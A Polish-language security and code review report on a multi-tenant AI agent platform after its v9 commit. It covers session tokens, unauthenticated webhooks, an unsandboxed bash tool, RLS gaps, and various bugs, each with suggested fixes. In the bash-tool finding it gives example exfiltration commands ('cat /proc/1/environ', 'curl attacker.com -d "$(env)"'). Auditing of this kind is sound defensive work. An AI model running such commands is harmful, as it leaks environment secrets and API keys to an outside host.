02 Bezpieczeństwo — nowe ustalenia po v9 KRYTYCZNE
CRITICAL Token sesji = UUIDv4 — entropii za mało dla tokenu bezpieczeństwa routes/auth.ts:96,141

Tokeny sesji są generowane przez uuidv4() — 122 bity entropii z CSPRNG, ale format jest rozpoznawalny, możliwy do wykrycia w logach, i wiele biblioteek/proxies loguje UUID inaczej niż opaque tokeny. Ważniejsze: jeśli UUID pochodzi z Math.random() w starszym środowisku Node (co przy pewnych wersjach v8 się zdarza), entropia dramatycznie spada.

routes/auth.ts — obecny kod: const token = uuidv4(); // ← UUID v4, przewidywalny format const expiresAt = new Date(); expiresAt.setDate(expiresAt.getDate() + 3); // ← 72h bez sliding expiry
Poprawka: Zastąpić uuidv4() kryptograficznym tokenem: import { randomBytes } from 'crypto'; const token = randomBytes(32).toString('hex'); — 256 bitów czystej entropii. Rozważyć skrócenie sesji do 24h z opcją "remember me" na 30 dni.
CRITICAL Integracje Slack/Discord bez uwierzytelniania — open webhook endpoint routes/integrations.ts

Endpointy POST /api/integrations/slack/events i /discord/webhook nie mają żadnego middleware autoryzacyjnego. Każdy kto zna adres może wywołać te endpointy i wstrzyknąć wiadomości do zadań agentów. Slack oficjalnie wymaga weryfikacji X-Slack-Signature — bez tego endpoint jest otwarty na replay attacks i content injection.

routes/integrations.ts — brak auth: router.post('/slack/events', async (req, res) => { // Brak: requireAuth(), weryfikacji signature, HMAC check if (req.body.challenge) return res.send(req.body.challenge); await IntegrationService.handleSlackEvent(req.body.event);
Poprawka: Dodać weryfikację podpisu Slack (X-Slack-Signature: v0=HMAC-SHA256(signingSecret, timestamp + body)). Dla Discorda — weryfikacja X-Signature-Ed25519. Middleware: verifySlackSignature(req, signingSecret) jako funkcja przed handlerem. W bazie dodać pole webhook_secret per integracja.
CRITICAL Bash tool nadal RCE — brak sandboxu i whitelist po v9 tools/executor.ts:case 'bash'

Niezmienione od raportu v1. exec(params.command) bez jakiejkolwiek walidacji. Jedyna zmiana w v9 to dodanie indeksów DB — problem bezpieczeństwa bash tools nie był adresowany. Agent może wykonać cat /proc/1/environ aby wyeksfiltrować klucze API, lub curl attacker.com -d "$(env)".

Minimalna poprawka (szybka): Dodać pole allowed_commands: string[] do konfiguracji narzędzia bash i walidować przez if (!tool.config.allowed_commands.some(cmd => params.command.startsWith(cmd))) throw new Error('Command not in whitelist'). Docelowa poprawka: Uruchamianie przez docker run --rm --network none --memory 128m --cpus 0.5 -v workspace:/workspace:rw alpine sh -c "...".
HIGH Luka w upgradie hasła — warunek porównania plain-text jest zawsze false dla nowych użytkowników, ale ujawnia wzorzec routes/auth.ts:131-137

Kod zawiera ścieżkę upgradu legacy hasła: user.rows[0].pwd_hash === `hash_${password}`. Ten wzorzec sugeruje że w bazie mogą istnieć "hasha" w formacie hash_<plaintext> — co jest de facto przechowywaniem plain-text haseł z prefiksem. Jeśli jakakolwiek starsza wersja kodu zapisała hasła w tym formacie do bazy, atakujący z dostępem do DB ma natychmiastowy dostęp do wszystkich starych haseł.

routes/auth.ts — problematyczny warunek: let validPassword = await verifyPassword(password, user.rows[0].pwd_hash); if (!validPassword && user.rows[0].pwd_hash === `hash_${password}`) { validPassword = true; // upgrade to scrypt... }
Poprawka: Jeśli te konta faktycznie istnieją — uruchomić jednorazową migrację która wymusi reset hasła przez email. Jeśli nie — usunąć tę ścieżkę kodu w całości. Zostawianie warunków porównujących plain-text hasła to technical debt z potencjalnym wpływem bezpieczeństwa.
HIGH CORS wildcard + brak helmet + brak rate limitingu — trójca niezmienna od v1 server/src/index.ts

Mimo commit v9 skupiającego się na "auth hardening" trzy standardowe zabezpieczenia HTTP nadal nie istnieją w projekcie:

  • app.use(cors()) — akceptuje requesty z każdej domeny (CSRF risk)
  • Brak helmet — brak nagłówków: CSP, X-Frame-Options, X-Content-Type-Options, HSTS
  • Brak express-rate-limit — endpoint /auth/login podatny na brute-force haseł
Poprawka (3 linie kodu): pnpm add helmet express-rate-limit, następnie: app.use(helmet()), app.use(cors({ origin: env.ALLOWED_ORIGINS })), app.use('/api/auth', rateLimit({ windowMs: 15*60*1000, max: 20 })).
NAPRAWIONE AUTH_ENABLED poprawnie zaimplementowane w env.ts + middleware env.ts + middleware/auth.ts

Zod schema parsuje AUTH_ENABLED z domyślną wartością 'true', transformuje do boolean. Middleware requireAuth() i requireRole() obsługują tryb dev (AUTH_ENABLED=false → fake user) i tryb produkcyjny. Rozkładanie sesji przez contextStore działa poprawnie dla RLS. ⚠ dev-bypass pozostaje — przy AUTH_ENABLED=false każdy request dostaje rolę 'owner' bez tokenu.

03 Baza danych — nowe ustalenia WAŻNE
CRITICAL db.transaction() nie ustawia RLS context — cross-tenant data leak możliwy w transakcjach db/client.ts:transaction()

Funkcja db.query() poprawnie ustawia set_config('app.current_company_id', ...) gdy contextStore ma companyId. Jednak db.transaction() pobiera klienta i od razu startuje BEGIN — bez ustawiania RLS kontekstu. Wszystkie zapytania wewnątrz transakcji działają z pustym current_company_id, co oznacza że polityki RLS widzą NULL i blokują dostęp lub — jeśli polityka używa true jako fallback — przepuszczają wszystkie wiersze ze wszystkich firm.

db/client.ts — transakcja bez RLS: transaction: async <T>(fn) => { const client = await pool.connect(); await client.query('BEGIN'); // ← brak: await client.query("SET LOCAL app.current_company_id = $1", [companyId]) const result = await fn(client); await client.query('COMMIT');
Poprawka: Rozszerzyć sygnaturę transaction(fn, companyId?: string) i na początku transakcji: if (companyId) await client.query("SELECT set_config('app.current_company_id', $1, true)", [companyId]). Alternatywnie pobrać z contextStore.getStore()?.companyId — analogicznie do db.query().
HIGH Schema v9 to kolejny patch — system migracji nadal bez wersjonowania db/migrate.ts + schema_v9.sql

Commit v9 dodał schema_v9.sql z indeksami zamiast naprawić sam system migracji. Mamy teraz 9 plików SQL wykonywanych sekwencyjnie bez żadnego śladu w bazie. Jeśli serwer produkcyjny już posiada te indeksy (bo ktoś je ręcznie dodał), migrate.ts nadal spróbuje je tworzyć i cicho zignoruje błąd — albo nie, jeśli błąd nie jest na liście ignorowanych kodów.

schema_v9.sql — CREATE INDEX IF NOT EXISTS — przynajmniej używa IF NOT EXISTS: CREATE UNIQUE INDEX IF NOT EXISTS idx_user_sessions_token ON user_sessions(token); -- ✓ IF NOT EXISTS jest dobrą praktyką, ale nadal brak tablicy migration_history
Poprawka (szybka): Dodać tabelę CREATE TABLE IF NOT EXISTS schema_migrations(version INT PRIMARY KEY, applied_at TIMESTAMPTZ DEFAULT now()) i w migrate.ts sprawdzać SELECT version FROM schema_migrations WHERE version = $1 przed każdym plikiem.
HIGH KnowledgeService.search() — wyszukiwanie bez wektora, ignoruje query parameter services/knowledge.ts:search()

Metoda search(companyId, query) przyjmuje parametr query, generuje embedding (mockowy), ale w ogóle nie używa go w zapytaniu SQL. Zapytanie po prostu zwraca pierwsze N dokumentów firmy posortowane według created_at. Kontekst wiedzy budowany dla agenta jest całkowicie losowy — agent dostaje te same dokumenty niezależnie od tego czego szuka.

services/knowledge.ts — query jest ignorowane: async search(companyId: string, query: string, limit = 5) { const mockEmbedding = Array(1536).fill(0).map(() => Math.random()); // losowy const res = await db.query( 'SELECT title, content FROM company_knowledge WHERE company_id = $1 LIMIT $2', // ↑ brak ORDER BY embedding <=> $vector — query w ogóle nie używane
Minimum viable fix: Dodać przynajmniej full-text search jako fallback do czasu prawdziwych embeddingów: WHERE company_id = $1 AND (to_tsvector(content) @@ plainto_tsquery($2) OR $2 = ''). Docelowo: ORDER BY embedding <=> $embeddingVector LIMIT $3.
MEDIUM Scheduler — zapytanie bez filtra company_id pobiera agentów ze wszystkich firm orchestrator/scheduler.ts:startOrchestrator()

Pętla schedulera wykonuje SELECT id FROM agents WHERE status = 'idle' — bez kontekstu firmy, bez RLS (bo brak contextStore w workerze). W środowisku multi-tenant wszystkie idle agenty ze wszystkich firm są przetwarzane razem, co jest poprawne operacyjnie, ale przy włączonym RLS może powodować problemy jeśli kiedyś scheduler będzie działał w ograniczonym kontekście. Poważniejszy problem: brak filtru AND status != 'terminated'.

scheduler.ts: SELECT id FROM agents WHERE status = 'idle' -- brak: AND status != 'terminated' -- brak: ORDER BY last_heartbeat_at ASC LIMIT 50 (throttling)
Poprawka: SELECT id FROM agents WHERE status = 'idle' AND status != 'terminated' ORDER BY updated_at ASC LIMIT 50. Limit zapobiega thundering herd gdy setki agentów są idle jednocześnie.
POPRAWA ✓ Indeksy v9 — znacząca poprawa wydajności zapytań krytycznych db/schema_v9.sql

7 nowych indeksów trafia dokładnie w najczęstsze zapytania systemu: idx_tasks_agent_status przyspieszy heartbeat checkout, idx_heartbeats_agent_time przyspieszy safety check, idx_audit_company_time przyspieszy stronę audit log. Użycie IF NOT EXISTS jest właściwą praktyką. Jedyny brakujący indeks krytyczny: idx_agents_company_status dla zapytania schedulera.

HIGH Template export eksportuje tylko agentów — brakuje tools, policies, goals, budgets services/template.ts

README opisuje template jako "export entire companies — agents, goals, tools, policies, and org structure". Aktualny TemplateService.exportCompany() eksportuje tylko name, mission i agents. Poprawka: Rozszerzyć export o 5 dodatkowych zapytań SQL i dostosować import z mapowaniem referencji (agent ref → new UUID). Dodać sanityzację secretów z tool.config (webhook_url, api_key) przed eksportem — co README obiecuje jako feature.
HIGH GeminiRuntime nie jest rejestrowany w worker.ts — agenty z runtime=gemini się nie uruchamiają worker.ts vs runtime/registry.ts

RuntimeRegistry w konstruktorze rejestruje Gemini warunkowo (if env.GOOGLE_API_KEY). Ale worker.ts importuje tylko ClaudeRuntime i OpenAIRuntime — bez GeminiRuntime. Gdy runtimeRegistry jest singleton importowanym przez worker, registry jest tworzone bez wpisu Gemini bo GeminiRuntime nie jest importowany do kontekstu workera.

worker.ts — brakujący import: import { ClaudeRuntime } from './runtime/claude.js'; import { OpenAIRuntime } from './runtime/openai.js'; // brak: import { GeminiRuntime } from './runtime/gemini.js'; // Komentarz: "Runtimes are auto-registered in RuntimeRegistry constructor" // ↑ nieprawda — registry.ts musi być importowany by konstruktor się wykonał
Poprawka: Dodać import { GeminiRuntime } from './runtime/gemini.js' do worker.ts. Alternatywnie — przerobić rejestrację na jawną: runtimeRegistry.register('claude', new ClaudeRuntime()) zamiast polegać na side-effects importów.
MEDIUM resolveApproval() — odblokowanie taska bez sprawdzenia czy agent nadal istnieje governance/approvals.ts:resolveApproval()

Gdy zatwierdzenie jest akceptowane, kod ustawia task.status = 'in_progress'. Nie sprawdza czy agent przypisany do taska jest nadal aktywny (może być terminated lub paused). Task zostaje odblokowany ale nikt go nie odbierze — scheduler pomija agenty nieaktywne. Task będzie "in_progress" na zawsze.

Poprawka: Po ustawieniu in_progress sprawdzić SELECT status FROM agents WHERE id = tasks.assigned_to. Jeśli agent nie jest idle, ustawić task z powrotem na assigned i rozważyć powiadomienie.
MEDIUM policies.ts — typy 'rate_limit' i 'tool_restriction' zdefiniowane w schema ale nie obsługiwane governance/policies.ts

Schema v2 i Zod schema w companies.ts definiują 5 typów polityk: approval_required, budget_threshold, delegation_limit, rate_limit, tool_restriction. Funkcja evaluatePolicy() obsługuje tylko pierwsze trzy. Tworzenie polityk rate_limit lub tool_restriction jest możliwe przez API, ale nie wywołuje żadnego efektu — switch case nie ma ich obsługi.

Poprawka: Albo usunąć te typy z enuma (podejście uczciwe), albo zaimplementować: rate_limit sprawdza heartbeats z ostatniej godziny vs rules.max_per_hour, tool_restriction blokuje określone narzędzia dla agentów.
MEDIUM Brak graceful shutdown w worker.ts — osierocone taski przy deploymencie worker.ts

Worker nie obsługuje SIGTERM ani SIGINT. Docker Compose wysyła SIGTERM podczas docker compose down lub rolling deploy i czeka domyślnie 10 sekund przed SIGKILL. Aktywne heartbeaty są natychmiastowo przerywane, taski zostają z status='in_progress' i locked_by=agentId. Następne uruchomienie workera nie może odebrać tych tasków.

Poprawka:
process.on('SIGTERM', async () => { stopOrchestrator(); await db.query("UPDATE tasks SET status='assigned', locked_by=NULL WHERE locked_by IS NOT NULL"); await db.close(); process.exit(0); });

06 Jakość kodu — pozostałe techniczne długi TECH DEBT
HIGH AgentActionsSchema — Zod discriminated union jest, ale heartbeat.ts nadal nie waliduje odpowiedzi modelu przez ten schema types/agent.ts ↔ orchestrator/heartbeat.ts

types/agent.ts ma doskonały AgentActionsSchema z Zod discriminated union dla wszystkich typów akcji. heartbeat.ts parsuje JSON z odpowiedzi LLM i wkłada go bezpośrednio do for (const action of response.actions) — bez jednej linii walidacji przez ten schema. Błędne typy akcji, brakujące pola, i malformed JSON są propagowane do obsługi bez żadnej ochrony.

claude.ts — brakująca walidacja: actions = JSON.parse(actionsMatch[1].trim()); // ← brak: const validated = AgentActionsSchema.safeParse(actions) // ← brak: if (!validated.success) { logger.error(...); actions = []; }
Poprawka (2 linie): Po parsowaniu JSON dodać const validated = AgentActionsSchema.safeParse(parsedActions); actions = validated.success ? validated.data : [];. Jeśli walidacja failuje — log + fallback na continue action.
MEDIUM routes/index.ts — /policies mapuje na companies router (błąd copy-paste) routes/index.ts:31

Linia router.use('/policies', companies) montuje router companies pod ścieżką /policies. Oznacza to że POST /api/policies trafia do handlera tworzenia firmy zamiast handlera tworzenia polityki. Polityki mają własne endpointy zdefiniowane wewnątrz companies.ts pod /policies, ale zewnętrzna ścieżka jest zepsuta.

routes/index.ts: router.use('/policies', companies); // ← powinno być: brak tej linii // polityki są już dostępne przez /companies/policies/* // lub: import policies from './policies.js'
Poprawka: Usunąć linię lub stworzyć dedykowany routes/policies.ts router i podmontować go tu.
MEDIUM Gemini runtime wysyła systemPrompt jako pierwszą wiadomość czatu — niezgodne z Gemini API runtime/gemini.ts

Gemini API wymaga że history musi zaczynać się od roli 'user', a nie 'model'. GeminiRuntime mapuje historię z assistant → model, ale nie sprawdza czy pierwsza wiadomość jest poprawna. Ponadto systemPrompt jest wysyłany jako argument do chat.sendMessage(systemPrompt) — co oznacza że system prompt jest pierwszą wiadomością użytkownika, nie systemowym promptem. Gemini 2.0 Flash obsługuje systemInstruction jako osobne pole.

Poprawka: Użyć model.startChat({ systemInstruction: { parts: [{ text: systemPrompt }] }, history: filteredHistory }) gdzie filteredHistory zapewnia że zaczyna się od 'user'. Następnie wywołać chat.sendMessage(task.description) zamiast systemu.
INFO Brak typów odpowiedzi API — frontend używa any[] dla większości danych pages/*.tsx

Mimo że types/agent.ts jest solidnie otypowany, wszystkie odpowiedzi API w dashboardzie są rzutowane przez any lub inferowane z lokalnych type definicji które dublują schemat serwera. Brakuje shared types package (@biuro/types) współdzielonego między server i dashboard. Każda zmiana schematu wymaga ręcznej synchronizacji typów w obu miejscach.

Sugestia długoterminowa: Dodać packages/types/ z eksportami typów DB entities i używać go w obu packageach. Ewentualnie wygenerować typy ze schematu SQL przez pg-to-ts lub kysely-codegen.

Projekt wyraźnie dojrzewa — ale kilka krytycznych luk pozostaje

Commit v9 zamknął największy problem z raportu v1: AUTH działa, hasła są hashowane poprawnie przez scrypt, dashboard pokazuje live dane, AuthContext obsługuje pełny flow sesji. To realny postęp, nie tylko kosmetyczny.

Trzy problemy nadal blokują deployment produkcyjny: bash exec bez sandboxu (RCE), integracje bez weryfikacji podpisu (content injection), i db.transaction() omijające RLS (data leak między firmami). Każdy z nich można naprawić w ciągu pół dnia pracy.
